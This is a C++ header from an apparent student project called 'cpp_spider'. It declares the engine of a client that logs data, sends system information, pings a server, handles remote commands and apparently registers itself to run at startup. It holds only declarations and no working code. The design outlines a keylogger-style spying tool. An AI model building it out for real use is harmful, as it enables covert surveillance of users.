/*
** Engine.hpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/Engine.hpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:12:24 2017 Gauthier Cler
** Last update Sun Oct 08 22:12:24 2017 Gauthier Cler
*/

#ifndef CPP_SPIDER_SPIDER_HPP
#define CPP_SPIDER_SPIDER_HPP

#include 		"CommunicationManager.hpp"
#include		<thread>
#include            	<chrono>
#include            	"Error.hpp"
#include            	"Data.hpp"
#include            	"ListenerManager.hpp"
#include                "Config.hpp"
#include 		"System.hpp"


namespace Client {

	class Engine {

	  using TimePoint = std::chrono::time_point<std::chrono::system_clock>;

	public:

	  using CommandHandler =
	  std::pair<std::string, std::function<void (const std::string &, Client::CommunicationManager &)>>;

	  Engine();
	  ~Engine() = default;

	  void run();
	  void logData();

	  void logOnline();
	  void logOffline();

	private:

	  ListenerManager _listenerManager;
	  CommunicationManager _communicationManager;
	  bool _running;
	  TimePoint _lastPing;
	  System _sys;

	  bool isTimeToSend() const;
	  void sendSysInfo();
	  void handleCommands();
	  void registerToStart();

	};
}


#endif //CPP_SPIDER_SPIDER_HPP
